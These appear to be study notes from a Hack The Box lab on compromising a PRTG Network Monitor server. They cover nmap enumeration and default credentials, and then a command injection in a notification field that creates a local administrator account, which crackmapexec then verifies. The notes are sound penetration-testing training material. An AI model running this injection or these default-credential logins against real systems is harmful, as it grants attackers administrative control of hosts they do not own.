## Discovery/Footprinting/Enumeration

```shell
3kjS@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50
```

Here we can see that EyeWitness lists the default credentials `prtgadmin:prtgadmin`
![](Pasted%20image%2020260730140909.png)

```url
http://10.129.201.50:8080/index.htm
```
![](Pasted%20image%2020260730140921.png)

```shell
3kjS@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```

```url
http://10.129.201.50:8080/welcome.htm
```
![](Pasted%20image%2020260730141137.png)
## Leveraging Known Vulnerabilities

```url
http://10.129.201.50:8080/myaccount.htm?tabid=2
```
![](Pasted%20image%2020260730141532.png)

```url
http://10.129.201.50:8080/editnotification.htm?id=new&tabid=1
```
![](Pasted%20image%2020260730141547.png)

For our purposes, we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`
![](Pasted%20image%2020260730141554.png)

```url
http://10.129.201.50:8080/myaccount.htm?tabid=2
```
![](Pasted%20image%2020260730141607.png)

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```
